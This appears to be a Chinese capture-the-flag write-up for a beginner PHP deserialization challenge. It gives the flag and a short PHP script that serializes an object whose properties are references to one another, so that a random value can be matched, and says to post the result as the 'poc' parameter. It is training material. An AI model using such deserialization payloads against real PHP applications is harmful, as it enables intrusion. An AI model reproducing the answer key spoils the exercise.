# 题目：php反序列化2

### 题目描述：你能控制你的值等于一个随机数么

### 题目难度： 🌟

### 维护：SiJiDo

### KEY: `nsctf{taiiiiiii1_li_hai_le}`

### 配置信息： 

1. 开放端口： 10008

### 解题过程：

```
<?php
class Index{
	private $name1;
	private $name2;
	protected $age1;
	protected $age2;
	function __construct(){
		$this->name1 = &$this->name2;
		$this->age1 = &$this->age2;
	}
}
$a = new Index();
echo urlencode(serialize($a));
```

生成的序列化字符串post传入poc参数即可

